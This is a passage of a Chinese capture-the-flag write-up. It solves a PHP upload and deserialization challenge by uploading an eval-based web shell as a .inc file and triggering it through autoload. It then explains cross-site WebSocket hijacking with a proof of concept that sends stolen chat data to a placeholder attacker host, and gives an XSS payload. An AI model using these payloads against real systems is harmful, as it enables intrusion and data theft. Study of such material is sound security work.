class="line"><span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$file</span>[<span class="string">&quot;error&quot;</span>] == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&#x27;size&#x27;</span>] &lt; <span class="number">102400</span>) &#123;</span><br><span class="line">        <span class="variable">$typeArr</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;/&quot;</span>, <span class="variable">$file</span>[<span class="string">&quot;type&quot;</span>]);</span><br><span class="line">        <span class="variable">$imgType</span> = <span class="keyword">array</span>(<span class="string">&quot;png&quot;</span>,<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;jpeg&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$typeArr</span>[<span class="number">0</span>]== <span class="string">&quot;image&quot;</span> | !<span class="title function_ invoke__">in_array</span>(<span class="variable">$typeArr</span>[<span class="number">1</span>], <span class="variable">$imgType</span>))&#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&quot;type error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$blackext</span> = [<span class="string">&quot;php&quot;</span>, <span class="string">&quot;php5&quot;</span>, <span class="string">&quot;php3&quot;</span>, <span class="string">&quot;html&quot;</span>, <span class="string">&quot;swf&quot;</span>, <span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>];</span><br><span class="line">        <span class="variable">$filearray</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file</span>[<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">        <span class="variable">$ext</span> = <span class="variable">$filearray</span>[<span class="string">&quot;extension&quot;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="variable">$blackext</span>)) &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&quot;extension error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$imgname</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">time</span>()).<span class="string">&quot;.&quot;</span>.<span class="variable">$ext</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="string">&quot;./&quot;</span>.<span class="variable">$imgname</span>)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">array_push</span>(<span class="variable">$userfile</span>, <span class="variable">$imgname</span>);</span><br><span class="line">            <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;userfile&quot;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$userfile</span>), <span class="title function_ invoke__">time</span>() + <span class="number">3600</span>*<span class="number">10</span>);</span><br><span class="line">            <span class="variable">$msg</span> = <span class="title function_ invoke__">e</span>(<span class="string">&quot;file: <span class="subst">&#123;$imgname&#125;</span>&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$msg</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;upload failed!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//config.inc.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">spl_autoload_register</span>();</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">e</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$userfile</span> = <span class="keyword">empty</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;userfile&quot;</span>]) ? [] : <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;userfile&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;p&gt;</span><br><span class="line">    &lt;a href=<span class="string">&quot;/index.php&quot;</span>&gt;Index&lt;/a&gt;</span><br><span class="line">    &lt;a href=<span class="string">&quot;/showfile.php&quot;</span>&gt;files&lt;/a&gt;</span><br><span class="line">&lt;/p&gt;</span><br></pre></td></tr></table></figure><p>我们都知道PHP框架如MVC等等 其中框架核心类里面都会有spl_autoload_register 为了高效率的包含文件，如果这里的spl_autoload_register 没有做限制的话 那么当你想new一个test类的时候 spl_autoload_register会自动去当前目录下包含文件名为test.php 或者是test.inc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;userfile&quot;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$userfile</span>), <span class="title function_ invoke__">time</span>() + <span class="number">3600</span>*<span class="number">10</span>);</span><br></pre></td></tr></table></figure><p>所以我们可以上传一个inc文件吗</p><p>然后再通过这里的反序列化 是否就可以日了</p><p>编写 .inc 文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(@<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>稍微改一下文件类型就ok</p><p><img src="/2022/07/30/qwb2022/image-20220801143146445.png" alt="image-20220801143146445"></p><p>文件名 350937a1b0d7be9d92be7fd716166e1b.inc</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://eci-<span class="number">2</span>zeen87cjclso2wq5edf.cloudeci1.ichunqiu.com/<span class="number">350937</span>a1b0d7be9d92be7fd716166e1b.inc</span><br></pre></td></tr></table></figure><p>我现在的目标就是去 new 一个 350937a1b0d7be9d92be7fd716166e1b 类即可</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">32</span>:<span class="string">&quot;350937a1b0d7be9d92be7fd716166e1b &quot;</span>:<span class="number">0</span>:&#123;&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/30/qwb2022/image-20220801160044952.png" alt="image-20220801160044952" style="zoom:33%;"><h2 id="babyweb"><a href="#babyweb" class="headerlink" title="babyweb"></a>babyweb</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">题目内容：</span><br><span class="line">本题下发后，请通过http访问相应的ip和port，例如 nc ip port ，改为http://ip:port/</span><br><span class="line">docker run -dit -p &quot;0.0.0.0:pub_port:8888&quot; </span><br><span class="line">http://39.107.137.85:35073</span><br></pre></td></tr></table></figure><p>用法</p><blockquote><p>help: 帮助菜单</p><p>changepw: 修改密码<br>示例: changepw 123456</p><p>bugreport: 向管理员报告漏洞页面<br>示例: bugreport <a href="http://host:port/login">http://host:port/login</a></p></blockquote><p>主要就是 websocket 相关的知识 学习一下 </p><p>去年就做过一个 websocket 的题 可惜一年前做的 全都忘得差不多了 重新学习一下</p><p><a href="https://wiki.wgpsec.org/knowledge/web/websocket-sec.html">WebSocket安全问题分析 | 狼组安全团队公开知识库 (wgpsec.org)</a></p><h3 id="websocket简单学习"><a href="#websocket简单学习" class="headerlink" title="websocket简单学习"></a>websocket简单学习</h3><h4 id="什么是websocket"><a href="#什么是websocket" class="headerlink" title="什么是websocket"></a>什么是websocket</h4><p>WebSocket是通过HTTP协议发起的一个双向全双工的通信协议。WebSocket协议被广泛用在现代WEB程序中用于数据流的传输和异步通信。</p><h4 id="WebSocket和HTTP的区别"><a href="#WebSocket和HTTP的区别" class="headerlink" title="WebSocket和HTTP的区别"></a>WebSocket和HTTP的区别</h4><p>大多数的Web浏览器和Web网站都是使用HTTP协议进行通信的。通过HTTP协议，客户端发送一个HTTP请求，然后服务器返回一个响应。通常来说，服务端返回一个响应后，这个HTTP请求事务就已经完成了。即使这个HTTP连接处于keep-alive的状态，它们之间的每一个工作(事务)依然是请求与响应，请求来了，响应回去了。这个事务就结束了。所以通常来说，HTTP协议是一个基于事务性的通信协议。</p><p>而WebSocket呢，它通常是由HTTP请求发起建立的，建立连接后，会始终保持连接状态。客户端和服务端可以随时随地的通过一个WebSocket互发消息，没有所谓事务性的特点。这里要注意了，源于其双向全双工的通信特点，在一个WebSocket连接中，服务端是可以主动发送消息的哦，这一点已经完全区别于HTTP协议了。</p><p>因此，基于以上特点，WebSocket通常用于低延迟和允许服务器发送消息的场景。例如，金融行业常用WebSocket来传输实时更新的数据。</p><h4 id="WebSocket的建立"><a href="#WebSocket的建立" class="headerlink" title="WebSocket的建立"></a>WebSocket的建立</h4><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ws = <span class="keyword">new</span> <span class="type">WebSocket</span>(<span class="string">&quot;wss://normal-website.com/chat&quot;</span>);</span><br></pre></td></tr></table></figure><blockquote><p>wss协议通过TLS连接建立一个WebSocket；ws协议是不经过加密的连接。</p></blockquote><h4 id="WebSocket握手"><a href="#WebSocket握手" class="headerlink" title="WebSocket握手"></a>WebSocket握手</h4><blockquote><p>通过HTTP协议，客户端和服务端进行一个WebSocket握手。</p></blockquote><p>客户端的握手请求：</p><blockquote><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/chat</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>normal-website.com</span><br><span class="line"><span class="attribute">Sec-WebSocket-Version</span><span class="punctuation">: </span>13</span><br><span class="line"><span class="attribute">Sec-WebSocket-Key</span><span class="punctuation">: </span>wDqumtseNBJdhkihL6PW7w==</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive, Upgrade</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2</span><br><span class="line"><span class="attribute">Upgrade</span><span class="punctuation">: </span>websocket</span><br></pre></td></tr></table></figure></blockquote><p>如果服务端接受这个连接，它会返回一个WebSocket回复：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">101</span> Switching Protocols</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>Upgrade</span><br><span class="line"><span class="attribute">Upgrade</span><span class="punctuation">: </span>websocket</span><br><span class="line"><span class="attribute">Sec-WebSocket-Accept</span><span class="punctuation">: </span>0FFP+2nmNIf/h+4BP36k9uzrYGk=</span><br></pre></td></tr></table></figure><p>之后，这个WebSocket的网络连接会保持开启状态，任意一方都可以直接发送WebSocket信息。</p><blockquote><p>关于WebSocket握手时的一些特性：</p><ul><li><code>Connection</code>和<code>Upgrade</code>头部用来标识这是一个WebSocket握手消息。</li><li><code>Sec-WebSocket-Version</code>请求头明确了一个客户端希望使用的WebSocket协议版本。版本<code>13</code>最常用。</li><li><code>Sec-WebSocket-Key</code>请求头包含了一个base64编码的随机值，在每个WebSocket握手请求中，它一定是随机生成的。</li><li><code>Sec-WebSocket-Accept</code>响应头的值是客户端发送的握手请求中<code>Sec-WebSocket-key</code>的哈希值，并与协议规范中定义的特定字符串连接。这样做的目的是匹配每一对握手请求，防止由于错误的配置或者缓存代理导致的连接错误。</li></ul></blockquote><h4 id="WebSocket的消息体是什么样的"><a href="#WebSocket的消息体是什么样的" class="headerlink" title="WebSocket的消息体是什么样的"></a>WebSocket的消息体是什么样的</h4><p>一旦一个WebSocket建立成功后，客户端和服务端任意一方都可以立即异步的发送消息。</p><p>例如，客户端可以通过JavaScirpt来简单的发送一个的消息：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ws.<span class="title function_">send</span>(<span class="string">&quot;From b1ue0cean&quot;</span>);</span><br></pre></td></tr></table></figure><p>本质上，WebSocket消息体可以包含任意数据格式的内容。在现代应用程序中，通过WebSocket发送JSON格式的消息体比较常见。</p><p>例如，一个聊天机器人的WEB程序可以使用WebSocket发送如下的内容:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;user&quot;</span><span class="punctuation">:</span><span class="string">&quot;b1ue0cean&quot;</span><span class="punctuation">,</span><span class="attr">&quot;content&quot;</span><span class="punctuation">:</span><span class="string">&quot;Hello b1ue0cean!&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="如何操控WebSocket"><a href="#如何操控WebSocket" class="headerlink" title="如何操控WebSocket"></a>如何操控WebSocket</h3><p>一个比较关心的问题</p><blockquote><p>寻找WebSockets的安全漏洞最常用的方法就是，操纵WebSocket的通信流，通过非预期的输入来进行安全测试。本章节主要讨论，如何操纵WebSocket的通信流，以及和操纵普通的HTTP通信相比，操控WebSocket通信时要注意哪些问题。</p></blockquote><ul><li>拦截和修改WebSocket信息</li><li>重放和生成一个新的WebSocket消息</li><li>操控WebSocket连接</li></ul><h4 id="1-拦截和修改WebSocket信息"><a href="#1-拦截和修改WebSocket信息" class="headerlink" title="1.拦截和修改WebSocket信息"></a>1.拦截和修改WebSocket信息</h4><p><img src="/2022/07/30/qwb2022/image-20220801164022859.png" alt="image-20220801164022859"></p><p>并可以进行重放</p><blockquote><p>注意：你可以在Proxy -&gt; Options -&gt; Intercept WebSockets Messages 中配置只拦截客户端 -&gt; 服务端， 或者服务端 -&gt;  客户端方向的WebSocket消息。（默认情况下两个方向都拦截）</p></blockquote><h4 id="2-重放和生成一个新的WebSocket消息"><a href="#2-重放和生成一个新的WebSocket消息" class="headerlink" title="2.重放和生成一个新的WebSocket消息"></a>2.重放和生成一个新的WebSocket消息</h4><p><img src="/2022/07/30/qwb2022/image-20220801164411493.png" alt="image-20220801164411493"></p><h4 id="3-操控WebSocket连接"><a href="#3-操控WebSocket连接" class="headerlink" title="3.操控WebSocket连接"></a>3.操控WebSocket连接</h4><p>当然，除了操控WebSocket双向中传递的消息体之外，我们也可以操纵WebSocket的握手环节。这可以引入一些有趣的高级的攻击手法。例如：WebSocket跨域劫持，这会在第四章节中讲解。</p><p>有很多场景下，操控WebSocket握手连接是非常有必要的：</p><ul><li>它可以扩展你的攻击面</li><li>一些攻击手法可能会导致你的连接断开，所以你需要去重新建立一个新的连接</li><li>Token或者其它的数据在原始的握手请求中可能被窃取或者需要更新</li></ul><p>你可以通过刚才讲到的Burp Repeater操控WebSocket握手：</p><ul><li>发送一个WebSocket消息到Burp Repeater中。</li><li>在Burp Repeater中，点击消息框右上角的小铅笔图标，选择一个WebSocket URL。然后在这个功能栏的下边你可以选择接入已经建立连接的WebSocket、克隆已经建立连接的WebSocket、或者重新连接一个已经断开连接的WebSocket。然后向导会根据你的操作给你一个详细的步骤，跟着做，修改消息体、或者是输入一个新的握手包。</li><li>输入或修改结束后点击Connect，Burp会发送你的配置的握手包，然后展示详细的执行结果。如果一个新的WebSocket连接被成功的建立，你可以在Repeater中来通过这个Socket发送新的消息包。</li></ul><h3 id="常见的WebSocket漏洞案例"><a href="#常见的WebSocket漏洞案例" class="headerlink" title="常见的WebSocket漏洞案例"></a>常见的WebSocket漏洞案例</h3><p>有一种WebSocket攻击类似于JSONP劫持，属于CSRF攻击的一种，它被称为<a href="https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking">cross-site WebSocket hijacking (opens new window)</a>攻击。</p><h3 id="1、什么是跨站WebSocket劫持？"><a href="#1、什么是跨站WebSocket劫持？" class="headerlink" title="1、什么是跨站WebSocket劫持？"></a>1、什么是跨站WebSocket劫持？</h3><p>跨站WebSocket劫持（也称为跨域WebSocket劫持）是一种由于WebSocket握手流程的安全缺陷所导致的跨站点请求伪造（CSRF）漏洞。</p><p>当WebSocket握手请求仅依靠HTTP cookie进行会话处理并且不包含任何CSRF token或其他不可预测的值时，就会出现这种漏洞。</p><p>攻击者可以在自己的站点上创建一个恶意网页，从而建立与易受攻击的应用程序的跨站点WebSocket连接。 该应用程序将在受害用户与该应用程序的会话的上下文中处理连接。</p><p>然后，攻击者的页面可以通过WebSocket连接向服务器发送任意消息，并读取从服务器接收回的消息内容。 这意味着，与常规的CSRF不同，攻击者可以与受攻击的应用程序进行双向交互。</p><h3 id="2、跨站WebSocket劫持的危害"><a href="#2、跨站WebSocket劫持的危害" class="headerlink" title="2、跨站WebSocket劫持的危害"></a>2、跨站WebSocket劫持的危害</h3><p>一个成功的跨站WebSocket劫持攻击通常会使攻击者能够：</p><ul><li>伪装成受害者用户来执行未经授权的行为，与常规CSRF一样，攻击者可以将任意消息发送到服务器端应用程序。 如果应用程序使用客户端生成的WebSocket消息执行任何敏感操作，则攻击者可以跨域生成合适的消息并触发这些操作。例如绑定手机号、修改密码等。</li><li>访问受害者的敏感数据。 与常规CSRF不同，跨站点WebSocket劫持使攻击者可以通过被劫持的WebSocket与易受攻击的应用程序进行双向交互。 如果应用程序使用服务器生成的WebSocket消息将任何敏感数据返回给用户，则攻击者可以拦截这些消息并捕获受害用户的数据。这意味着无需跨域方法的支持(JSONP、CORS)，也可以读取受害者的数据。</li></ul><h3 id="3、如何进行一个跨站WebSocket劫持攻击"><a href="#3、如何进行一个跨站WebSocket劫持攻击" class="headerlink" title="3、如何进行一个跨站WebSocket劫持攻击"></a>3、如何进行一个跨站WebSocket劫持攻击</h3><p>由于跨站点WebSocket劫持攻击本质上是WebSocket握手上的CSRF漏洞，因此执行攻击的第一步是检查应用程序执行的WebSocket握手过程是否针对CSRF进行了保护。</p><p>就正常的CSRF攻击流程而言，通常需要找到一个握手消息，该消息仅依赖HTTP cookie进行会话处理，并且在请求参数中不使用任何token或其他不可预测的值。</p><p>例如，以下WebSocket握手请求可能容易受到CSRF的攻击，因为唯一的session token是在cookie中传输的：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/chat</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>normal-website.com</span><br><span class="line"><span class="attribute">Sec-WebSocket-Version</span><span class="punctuation">: </span>13</span><br><span class="line"><span class="attribute">Sec-WebSocket-Key</span><span class="punctuation">: </span>wDqumtseNBJdhkihL6PW7w==</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive, Upgrade</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2</span><br><span class="line"><span class="attribute">Upgrade</span><span class="punctuation">: </span>websocket</span><br></pre></td></tr></table></figure><blockquote><p>注意:<code>Sec-WebSocket-Key</code> 请求头包含的随机值主要用于防止代理服务器缓存错误，并且不用于身份验证或会话处理目的。</p></blockquote><p>如果WebSocket握手请求易受CSRF的攻击，则攻击者的网页可以执行跨站点请求，与易受攻击的服务器后端接口建立WebSocket。 攻击中接下来发生的事情完全取决于应用程序的逻辑以及它如何使用WebSockets。 攻击可能涉及：</p><ul><li>发送WebSocket消息以代表受害用户执行未经授权的操作。</li><li>发送WebSocket消息以检索敏感数据。</li><li>有时，可能只需要等待包含敏感数据的消息发送过来。</li></ul><p>例如，一个跨站WebSocket劫持读取用户聊天记录的POC如下，用户在建立WebSocket连接后，向服务器发送’READY’字符串，即可接收到服务器传来的历史聊天记录。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// Create WebSocket connection.</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> ws = <span class="keyword">new</span> <span class="title class_">WebSocket</span>(<span class="string">&quot;wss://vulnerable-site.com/chat&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// Connection opened</span></span></span><br><span class="line"><span class="language-javascript">ws.<span class="title function_">addEventListener</span>(<span class="string">&#x27;open&#x27;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    ws.<span class="title function_">send</span>(<span class="string">&#x27;READY&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">&#125;);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// Listen for messages</span></span></span><br><span class="line"><span class="language-javascript">ws.<span class="property">onmessage</span> = <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">fetch</span>(<span class="string">&#x27;https://attacker-vps.com/?log&#x27;</span>+event.<span class="property">data</span>, &#123;<span class="attr">mode</span>: <span class="string">&#x27;no-cors&#x27;</span>&#125;)</span></span><br><span class="line"><span class="language-javascript">&#125;;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="跨站WebSockets攻击"><a href="#跨站WebSockets攻击" class="headerlink" title="跨站WebSockets攻击"></a>跨站WebSockets攻击</h3><h4 id="操控WebSocket消息体寻找漏洞"><a href="#操控WebSocket消息体寻找漏洞" class="headerlink" title="操控WebSocket消息体寻找漏洞"></a>操控WebSocket消息体寻找漏洞</h4><p>通过篡改 WebSocket 消息的内容，可以发现并利用大多数基于输入的漏洞。</p><p>例如，一个具有聊天功能的Web程序使用WebSocket在客户端和服务端之间传输消息。当一个用户输入聊天消息时，如下的一个WebSocket消息被发送到服务端：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;message&quot;</span><span class="punctuation">:</span><span class="string">&quot;Hello Tom！&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>服务端会将这个消息内容通过WebSocket转发给另外一个用户Tom，然后在Tom的浏览器中被JS渲染为一段HTML代码。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>Hello Carlos<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当服务器没有对转发的内容做安全防御或过滤时，可能就会引发XSS攻击。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;message&quot;</span><span class="punctuation">:</span><span class="string">&quot;&lt;img src=1 onerror=&#x27;alert(1)&#x27;&gt;&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><p>源码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">        <span class="keyword">var</span> ws = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">var</span> url = <span class="string">&quot;ws://&quot;</span> + <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">host</span> + <span class="string">&quot;/bot&quot;</span>;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">sendtobot</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (ws) &#123;</span><br><span class="line">                <span class="keyword">var</span> msg = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;sendbox&quot;</span>).<span class="property">value</span>;</span><br><span class="line">                ws.<span class="title function_">send</span>(msg);</span><br><span class="line">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;sendbox&quot;</span>).<span class="property">value</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;chatbox&quot;</span>).<span class="title function_">append</span>(<span class="string">&quot;你: &quot;</span> + msg + <span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                ws = <span class="keyword">new</span> <span class="title class_">WebSocket</span>(url);</span><br><span class="line">                ws.<span class="property">onopen</span> = <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;connection open!&#x27;</span>)</span><br><span class="line">                    <span class="keyword">var</span> msg = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;sendbox&quot;</span>).<span class="property">value</span>;</span><br><span class="line">                    ws.<span class="title function_">send</span>(msg);</span><br><span class="line">                    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;sendbox&quot;</span>).<span class="property">value</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;chatbox&quot;</span>).<span class="title function_">append</span>(<span class="string">&quot;你: &quot;</span> + msg + <span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                ws.<span class="property">onmessage</span> = <span class="keyword">function</span> (<span class="params">ev</span>) &#123;</span><br><span class="line">                    <span class="title function_">botsay</span>(ev.<span class="property">data</span>);</span><br><span class="line">                &#125;;</span><br><span class="line">                ws.<span class="property">onerror</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;connection error&quot;</span>);</span><br><span class="line">                &#125;;</span><br><span class="line">                ws.<span class="property">onclose</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;connection close!&quot;</span>);</span><br><span class="line">                &#125;;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">closeWebSocket</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(ws)&#123;</span><br><span class="line">                ws.<span class="title function_">close</span>();</span><br><span class="line">                ws = <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">botsay</span>(<span class="params">content</span>) &#123;</span><br><span class="line">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span 